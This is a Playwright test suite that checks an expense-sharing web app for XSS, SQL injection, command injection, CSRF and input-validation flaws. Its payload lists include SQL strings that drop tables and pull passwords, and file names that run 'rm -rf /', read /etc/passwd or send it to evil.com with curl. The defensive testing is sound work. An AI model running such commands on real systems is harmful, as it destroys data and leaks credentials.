import {expect, multiUserTest as test} from '../../fixtures/multi-user-test';
import {pageTest} from '../../fixtures';
import {setupMCPDebugOnFailure} from '../../helpers';
import {GroupWorkflow} from '../../workflows';
import {generateTestGroupName} from '../../utils/test-helpers';

// Enable console error reporting and MCP debugging
setupMCPDebugOnFailure();

test.describe('Security Input Validation Tests', () => {
  test.describe('XSS Prevention', () => {
    test('prevents XSS in expense descriptions', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Create group for testing
      const groupWorkflow = new GroupWorkflow(page);
      const groupName = generateTestGroupName('XSSExpense');
      await groupWorkflow.createGroupAndNavigate(groupName, 'Testing XSS in expense descriptions');
      
      const xssPayloads = [
        '<script>alert("xss1")</script>',
        '<img src="x" onerror="alert(\'xss2\')">',
        'javascript:alert("xss3")',
        '<svg onload="alert(\'xss4\')">',
        '"><script>alert("xss5")</script>',
        '\\u003cscript\\u003ealert("xss6")\\u003c/script\\u003e',
        '<iframe src="javascript:alert(\'xss7\')"></iframe>',
        '<object data="javascript:alert(\'xss8\')"></object>',
        '<embed src="javascript:alert(\'xss9\')">',
        '<link rel="stylesheet" href="javascript:alert(\'xss10\')">',
        '<style>@import"javascript:alert(\'xss11\')";</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss12\')">',
        'data:text/html,<script>alert("xss13")</script>',
        'vbscript:msgbox("xss14")',
        '<form><button formaction="javascript:alert(\'xss15\')">',
        '<input onfocus="alert(\'xss16\')" autofocus>',
        '<select onfocus="alert(\'xss17\')" autofocus><option>',
        '<textarea onfocus="alert(\'xss18\')" autofocus>',
        '<keygen onfocus="alert(\'xss19\')" autofocus>',
        '<video><source onerror="alert(\'xss20\')">',
        '<audio src=x onerror="alert(\'xss21\')">',
        '<details open ontoggle="alert(\'xss22\')">',
        '<marquee onstart="alert(\'xss23\')">',
        '<!--<script>alert("xss24")</script>-->',
      ];
      
      for (const [index, payload] of xssPayloads.entries()) {
        await page.click('[data-testid="add-expense-button"]');
        await page.waitForSelector('[data-testid="expense-description"]');
        
        // Clear any existing content
        await page.fill('[data-testid="expense-description"]', '');
        
        // Insert XSS payload
        await page.fill('[data-testid="expense-description"]', payload);
        await page.fill('[data-testid="expense-amount"]', (25 + index).toString());
        
        // Try to save
        await page.click('[data-testid="save-expense-button"]');
        await page.waitForLoadState('domcontentloaded');
        
        if (page.url().includes('/add-expense')) {
          // If still on add expense page, should show validation error
          const errorElement = page.locator('[data-testid="error-message"], [data-testid="description-error"]');
          if (await errorElement.isVisible()) {
            const errorText = await errorElement.textContent();
            expect(errorText).toMatch(/invalid|dangerous|not allowed|restricted/i);
          }
          await page.click('[data-testid="cancel-button"]');
        } else {
          // If expense was created, verify XSS was sanitized
          await page.waitForSelector('[data-testid="expense-item"]');
          await page.click('[data-testid="expense-item"]:last-of-type');
          
          const description = await page.locator('[data-testid="expense-description"]').textContent();
          
          // Verify dangerous content was sanitized
          expect(description).not.toContain('<script>');
          expect(description).not.toContain('javascript:');
          expect(description).not.toContain('vbscript:');
          expect(description).not.toContain('onerror=');
          expect(description).not.toContain('onload=');
          expect(description).not.toContain('onfocus=');
          expect(description).not.toContain('onclick=');
          expect(description).not.toContain('<iframe');
          expect(description).not.toContain('<object');
          expect(description).not.toContain('<embed');
          expect(description).not.toContain('data:text/html');
          
          await page.goBack();
        }
      }
    });

    test('prevents XSS in group names and descriptions', async ({ authenticatedPage }) => {
      const { page, dashboardPage } = authenticatedPage;
      
      await dashboardPage.navigate();
      
      const xssPayloads = [
        '<script>alert("group-xss1")</script>',
        '<img src=x onerror="alert(\'group-xss2\')">',
        'javascript:alert("group-xss3")',
        '<svg/onload="alert(\'group-xss4\')">',
        '"><script>alert("group-xss5")</script>',
        '<iframe src="javascript:alert(\'group-xss6\')">',
        '<style>body{background:url("javascript:alert(\'group-xss7\')")}</style>'
      ];
      
      for (const [index, payload] of xssPayloads.entries()) {
        await page.click('[data-testid="create-group-button"]');
        await page.waitForSelector('[data-testid="group-name-input"]');
        
        // Test XSS in group name
        await page.fill('[data-testid="group-name-input"]', payload);
        await page.fill('[data-testid="group-description-input"]', `Test description ${index}`);
        await page.click('[data-testid="create-group-submit"]');
        
        await page.waitForLoadState('domcontentloaded');
        
        if (page.url().includes('/dashboard')) {
          // Check for validation error
          const errorElement = page.locator('[data-testid="error-message"], [data-testid="name-error"]');
          if (await errorElement.isVisible()) {
            // Good - XSS was rejected
            const errorText = await errorElement.textContent();
            expect(errorText).toMatch(/invalid|dangerous|not allowed/i);
          } else {
            // If group was created, verify name was sanitized
            const groupCards = page.locator('[data-testid="group-card"]');
            const lastGroup = groupCards.last();
            const groupName = await lastGroup.locator('[data-testid="group-name"]').textContent();
            
            expect(groupName).not.toContain('<script>');
            expect(groupName).not.toContain('javascript:');
            expect(groupName).not.toContain('onerror=');
            expect(groupName).not.toContain('<iframe');
            expect(groupName).not.toContain('<svg');
            expect(groupName).not.toContain('<style>');
          }
        }
        
        // Navigate back to dashboard for next test
        await page.goto('/dashboard');
        await page.waitForSelector('[data-testid="dashboard"]');
      }
    });

    test('prevents XSS in user profile fields', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Navigate to profile/settings if available
      const profileButton = page.locator('[data-testid="profile-button"], [data-testid="user-menu"]');
      
      if (await profileButton.isVisible()) {
        await profileButton.click();
        
        const profileLink = page.locator('[data-testid="profile-link"], text=Profile, text=Settings');
        if (await profileLink.isVisible()) {
          await profileLink.click();
          
          const xssPayloads = [
            '<script>alert("profile-xss")</script>',
            '<img src=x onerror="alert(\'profile\')">',
            'javascript:alert("profile")'
          ];
          
          for (const payload of xssPayloads) {
            // Test display name XSS
            const displayNameField = page.locator('[data-testid="display-name"], [name="displayName"]');
            if (await displayNameField.isVisible()) {
              await displayNameField.fill(payload);
              
              const saveButton = page.locator('[data-testid="save-profile"], [type="submit"]');
              if (await saveButton.isVisible()) {
                await saveButton.click();
                await page.waitForLoadState('domcontentloaded');
                
                // Check for validation error or sanitization
                const errorElement = page.locator('[data-testid="error-message"]');
                if (await errorElement.isVisible()) {
                  const errorText = await errorElement.textContent();
                  expect(errorText).toMatch(/invalid|dangerous/i);
                } else {
                  // If saved, verify sanitization
                  const savedName = await displayNameField.inputValue();
                  expect(savedName).not.toContain('<script>');
                  expect(savedName).not.toContain('javascript:');
                  expect(savedName).not.toContain('onerror=');
                }
              }
            }
          }
        }
      }
    });
  });

  test.describe('SQL Injection Prevention', () => {
    test('prevents SQL injection in search and filter parameters', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Create group with multiple expenses for search testing
      const groupWorkflow = new GroupWorkflow(page);
      const groupName = generateTestGroupName('SQLTest');
      await groupWorkflow.createGroupAndNavigate(groupName, 'Testing SQL injection prevention');
      
      // Add several expenses
      const expenses = [
        { desc: 'Coffee', amount: '5.00' },
        { desc: 'Lunch', amount: '15.00' },
        { desc: 'Dinner', amount: '25.00' }
      ];
      
      for (const expense of expenses) {
        await page.click('[data-testid="add-expense-button"]');
        await page.fill('[data-testid="expense-description"]', expense.desc);
        await page.fill('[data-testid="expense-amount"]', expense.amount);
        await page.click('[data-testid="save-expense-button"]');
        await page.waitForSelector('[data-testid="expense-item"]');
      }
      
      // Test SQL injection in search/filter fields
      const sqlPayloads = [
        "'; DROP TABLE expenses; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        "admin'/*",
        ") OR 1=1--",
        "'; TRUNCATE TABLE groups; --",
        "' AND 1=0 UNION SELECT password FROM users--",
        "1' ORDER BY 1--",
        "1' GROUP BY 1--",
        "1' HAVING 1=1--",
        "'; INSERT INTO expenses VALUES (999999, 'hacked'); --",
        "' OR 'x'='x",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "1' AND SUBSTRING(@@version,1,1) = '5'--",
        "' UNION SELECT NULL,NULL,NULL--"
      ];
      
      // Test in search field if available
      const searchField = page.locator('[data-testid="expense-search"], [data-testid="search-input"]');
      if (await searchField.isVisible()) {
        for (const payload of sqlPayloads) {
          await searchField.fill(payload);
          // Submit search using button instead of keyboard  
          const searchButton = page.getByRole('button', { name: /search/i });
          if (await searchButton.isVisible()) {
            await searchButton.click();
          } else {
            // If no search button, submit the form containing the search input
            await page.locator('[data-testid="expense-search"]').press('Enter');
          }
          await page.waitForLoadState('domcontentloaded');
          
          // Should either show no results or validation error, not crash
          const expenseItems = page.locator('[data-testid="expense-item"]');
          const count = await expenseItems.count();
          
          // Should not return all expenses (which might indicate successful injection)
          expect(count).toBeLessThanOrEqual(expenses.length);
          
          // Clear search
          await searchField.fill('');
          // Submit search using button instead of keyboard  
          const searchButton = page.getByRole('button', { name: /search/i });
          if (await searchButton.isVisible()) {
            await searchButton.click();
          } else {
            // If no search button, submit the form containing the search input
            await page.locator('[data-testid="expense-search"]').press('Enter');
          }
        }
      }
      
      // Test in URL parameters
      const groupId = page.url().split('/groups/')[1];
      
      for (const payload of sqlPayloads) {
        // Test SQL injection in URL parameters
        const maliciousUrl = `/groups/${groupId}?search=${encodeURIComponent(payload)}`;
        await page.goto(maliciousUrl);
        await page.waitForLoadState('domcontentloaded');
        
        // Should not crash or expose sensitive data
        const pageContent = await page.textContent('body');
        expect(pageContent).not.toContain('error in your SQL syntax');
        expect(pageContent).not.toContain('mysql_');
        expect(pageContent).not.toContain('ORA-');
        expect(pageContent).not.toContain('PostgreSQL');
        expect(pageContent).not.toContain('syntax error');
      }
    });

    test('prevents SQL injection in expense filters', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Navigate to dashboard to test group filtering
      await page.goto('/dashboard');
      await page.waitForSelector('[data-testid="dashboard"]');
      
      // Test SQL injection in various filter parameters
      const sqlPayloads = [
        "' OR 1=1--",
        "'; DELETE FROM groups WHERE id='",
        "' UNION SELECT password FROM users--",
        "1' AND (SELECT COUNT(*) FROM sensitive_table) > 0--"
      ];
      
      for (const payload of sqlPayloads) {
        // Test in category filter if available
        const categoryFilter = page.locator('[data-testid="category-filter"]');
        if (await categoryFilter.isVisible()) {
          await categoryFilter.selectOption(payload);
          await page.waitForLoadState('domcontentloaded');
          
          // Should handle gracefully
          const errorElement = page.locator('[data-testid="error-message"]');
          if (await errorElement.isVisible()) {
            const errorText = await errorElement.textContent();
            expect(errorText).not.toContain('SQL');
            expect(errorText).not.toContain('syntax');
          }
        }
        
        // Test in date filter if available
        const dateFilter = page.locator('[data-testid="date-filter"]');
        if (await dateFilter.isVisible()) {
          await dateFilter.fill(payload);
          await page.waitForLoadState('domcontentloaded');
          
          // Should validate date format
          const dateError = page.locator('[data-testid="date-error"]');
          if (await dateError.isVisible()) {
            const errorText = await dateError.textContent();
            expect(errorText).toMatch(/invalid date|date format/i);
          }
        }
      }
    });
  });

  test.describe('Command Injection Prevention', () => {
    test('prevents command injection in file upload names', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Create group for testing
      const groupWorkflow = new GroupWorkflow(page);
      const groupName = generateTestGroupName('CommandInjection');
      await groupWorkflow.createGroupAndNavigate(groupName, 'Testing command injection prevention');
      
      // Test command injection in file upload
      await page.click('[data-testid="add-expense-button"]');
      await page.fill('[data-testid="expense-description"]', 'Receipt test');
      await page.fill('[data-testid="expense-amount"]', '35.00');
      
      const fileInput = page.locator('[data-testid="receipt-upload"], input[type="file"]');
      if (await fileInput.isVisible()) {
        const maliciousFilenames = [
          '; rm -rf / ;',
          '& del /f /q C:\\* &',
          '| cat /etc/passwd |',
          '`whoami`',
          '$(id)',
          '${PATH}',
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '; curl http://evil.com/steal?data=$(cat /etc/passwd) ;',
          '& powershell -c "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts" &'
        ];
        
        for (const filename of maliciousFilenames) {
          const testFile = Buffer.from('test receipt content');
          
          try {
            await fileInput.setInputFiles({
              name: filename,
              mimeType: 'text/plain',
              buffer: testFile
            });
            
            await page.click('[data-testid="save-expense-button"]');
            await page.waitForLoadState('domcontentloaded');
            
            if (page.url().includes('/add-expense')) {
              // Should show validation error for dangerous filenames
              const errorElement = page.locator('[data-testid="error-message"], [data-testid="file-error"]');
              if (await errorElement.isVisible()) {
                const errorText = await errorElement.textContent();
                expect(errorText).toMatch(/invalid filename|dangerous characters|not allowed/i);
              }
            } else {
              // If uploaded, filename should be sanitized
              await page.click('[data-testid="expense-item"]');
              const receiptElement = page.locator('[data-testid="receipt-image"], [data-testid="receipt-link"]');
              
              if (await receiptElement.isVisible()) {
                const receiptUrl = await receiptElement.getAttribute('src') || 
                                   await receiptElement.getAttribute('href');
                
                // URL should not contain dangerous characters
                expect(receiptUrl).not.toContain(';');
                expect(receiptUrl).not.toContain('&');
                expect(receiptUrl).not.toContain('|');
                expect(receiptUrl).not.toContain('`');
                expect(receiptUrl).not.toContain('$');
                expect(receiptUrl).not.toContain('../');
                expect(receiptUrl).not.toContain('..\\');
              }
              
              await page.goBack();
            }
            
            // Reset for next test
            await page.click('[data-testid="cancel-button"], [data-testid="delete-expense-button"]');
            if (page.url().includes('/add-expense')) {
              await page.click('[data-testid="cancel-button"]');
            }
          } catch (error) {
            // File upload rejection is acceptable
            console.log(`File upload rejected for ${filename}:`, error);
          }
        }
      }
    });
  });

  test.describe('Data Type Validation', () => {
    test('validates numeric inputs properly', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Create group for testing
      const groupWorkflow = new GroupWorkflow(page);
      const groupName = generateTestGroupName('NumericValidation');
      await groupWorkflow.createGroupAndNavigate(groupName, 'Testing numeric validation');
      
      const invalidAmounts = [
        'abc',           // Non-numeric
        '1.2.3',         // Multiple decimals
        '1,000.00',      // Comma separators
        '1 000.00',      // Space separators
        '€50.00',        // Currency symbols
        '$100',          // Currency symbols
        '1e10',          // Scientific notation
        'Infinity',      // Special values
        'NaN',           // Special values
        '-0',            // Negative zero
        '01.00',         // Leading zeros
        '.50',           // No leading digit
        '50.',           // No trailing digit
        '1.234567',      // Too many decimals
        '99999999999999999999', // Too large
        '\u0660\u0661', // Unicode digits
        '𝟏𝟎𝟎',         // Mathematical alphanumeric symbols
        '①②③',          // Circled numbers
      ];
      
      for (const amount of invalidAmounts) {
        await page.click('[data-testid="add-expense-button"]');
        await page.fill('[data-testid="expense-description"]', 'Validation test');
        await page.fill('[data-testid="expense-amount"]', amount);
        await page.click('[data-testid="save-expense-button"]');
        
        // Should show validation error
        const amountError = page.locator('[data-testid="amount-error"], [data-testid="error-message"]');
        await expect(amountError).toBeVisible({ timeout: 3000 });
        
        const errorText = await amountError.textContent();
        expect(errorText).toMatch(/invalid.*amount|invalid.*number|must be.*number/i);
        
        await page.click('[data-testid="cancel-button"]');
        await page.waitForSelector('[data-testid="group-header"]');
      }
    });

    test('validates date inputs properly', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Create group for testing
      const groupWorkflow = new GroupWorkflow(page);
      const groupName = generateTestGroupName('DateValidation');
      await groupWorkflow.createGroupAndNavigate(groupName, 'Testing date validation');
      
      const invalidDates = [
        '2023-13-01',    // Invalid month
        '2023-02-30',    // Invalid day for month
        '2023-02-29',    // Invalid day for non-leap year
        '2023/02/15',    // Wrong format
        '15-02-2023',    // Wrong format
        '2023.02.15',    // Wrong format
        'invalid-date',  // Non-date string
        '9999-99-99',    // Invalid date components
        '0000-00-00',    // Zero date
        '2023-00-15',    // Invalid month
        '2023-02-00',    // Invalid day
        '99-02-15',      // Two-digit year
        '2023',          // Year only
        '02-15',         // Month-day only
        '',              // Empty
        '2023-02-15T25:00:00', // Invalid time
        '2023-02-15T12:60:00', // Invalid time
        '2023-02-15T12:30:60', // Invalid time
      ];
      
      for (const date of invalidDates) {
        await page.click('[data-testid="add-expense-button"]');
        await page.fill('[data-testid="expense-description"]', 'Date test');
        await page.fill('[data-testid="expense-amount"]', '30.00');
        
        // Try to set invalid date
        const dateField = page.locator('[data-testid="expense-date"], [name="date"]');
        if (await dateField.isVisible()) {
          await dateField.fill(date);
          await page.click('[data-testid="save-expense-button"]');
          
          // Should show validation error
          const dateError = page.locator('[data-testid="date-error"], [data-testid="error-message"]');
          if (await dateError.isVisible()) {
            const errorText = await dateError.textContent();
            expect(errorText).toMatch(/invalid.*date|date.*format|valid.*date/i);
          }
        }
        
        await page.click('[data-testid="cancel-button"]');
        await page.waitForSelector('[data-testid="group-header"]');
      }
    });
  });

  test.describe('Content Security Policy', () => {
    test('enforces CSP headers and prevents inline script execution', async ({ authenticatedPage }) => {
      const { page } = authenticatedPage;
      
      // Check CSP headers
      const response = await page.goto('/dashboard');
      const cspHeader = response?.headers()['content-security-policy'];
      
      if (cspHeader) {
        // Verify CSP contains important directives
        expect(cspHeader).toMatch(/script-src/);
        expect(cspHeader).not.toContain("'unsafe-inline'"); // Should not allow inline scripts
        expect(cspHeader).not.toContain("'unsafe-eval'");   // Should not allow eval
      }
      
      // Test that inline scripts are blocked
      await page.waitForSelector('[data-testid="dashboard"]');
      
      // Try to inject inline script
      const scriptInjection = `
        <div onclick="alert('CSP bypass')" data-testid="malicious-element">
          Click me for XSS
        </div>
        <script>alert('Inline script executed')</script>
      `;
      
      // Try to inject via innerHTML (should be blocked by CSP)
      const injectionResult = await page.evaluate((script: string) => {
        try {
          const div = document.createElement('div');
          div.innerHTML = script;
          document.body.appendChild(div);
          return 'injected';
        } catch (error) {
          return 'blocked';
        }
      }, scriptInjection);
      
      // If injection succeeded, verify scripts didn't execute
      if (injectionResult === 'injected') {
        const maliciousElement = page.locator('[data-testid="malicious-element"]');
        if (await maliciousElement.isVisible()) {
          // Element might be inserted but onclick should be blocked by CSP
          await maliciousElement.click();
          
          // No alert should appear (CSP should block inline event handlers)
          await page.waitForLoadState('domcontentloaded');
          
          // Check that no alert appeared
          const alerts = await page.evaluate(() => {
            return (window as any).__alertCount || 0;
          });
          expect(alerts).toBe(0);
        }
      }
    });
  });
});

// Additional test for CSRF protection
pageTest.describe('CSRF Protection', () => {
  pageTest('should include CSRF protection mechanisms', async ({ page, loginPage }) => {
    await loginPage.navigate();
    
    // Check for CSRF tokens in forms
    const forms = page.locator('form');
    const formCount = await forms.count();
    
    for (let i = 0; i < formCount; i++) {
      const form = forms.nth(i);
      
      // Look for CSRF token fields
      const csrfField = form.locator('input[name*="csrf"], input[name*="token"], input[type="hidden"]');
      
      if (await csrfField.count() > 0) {
        const tokenValue = await csrfField.first().getAttribute('value');
        expect(tokenValue).toBeTruthy();
        expect(tokenValue!.length).toBeGreaterThan(10); // Should be a substantial token
      }
    }
    
    // Check for SameSite cookie attributes if login form exists
    const loginForm = page.locator('[data-testid="login-form"]');
    if (await loginForm.isVisible()) {
      await page.fill('[data-testid="email-input"]', 'test@example.com');
      await page.fill('[data-testid="password-input"]', 'testpassword');
      
      // Monitor cookies set during login attempt
      const cookiePromise = page.waitForEvent('response', response => 
        response.url().includes('login') && response.status() !== 200
      );
      
      await page.click('[data-testid="login-submit"]');
      
      try {
        await cookiePromise;
        
        // Check cookies for security attributes
        const cookies = await page.context().cookies();
        
        cookies.forEach(cookie => {
          if (cookie.name.toLowerCase().includes('session') || 
              cookie.name.toLowerCase().includes('auth') ||
              cookie.name.toLowerCase().includes('token')) {
            
            expect(cookie.secure).toBe(true);     // Should be secure
            expect(cookie.httpOnly).toBe(true);   // Should be HTTP-only
            expect(cookie.sameSite).toMatch(/strict|lax/i); // Should have SameSite
          }
        });
      } catch (error) {
        // Login might fail with test credentials, which is expected
        console.log('Login failed as expected with test credentials');
      }
    }
  });
});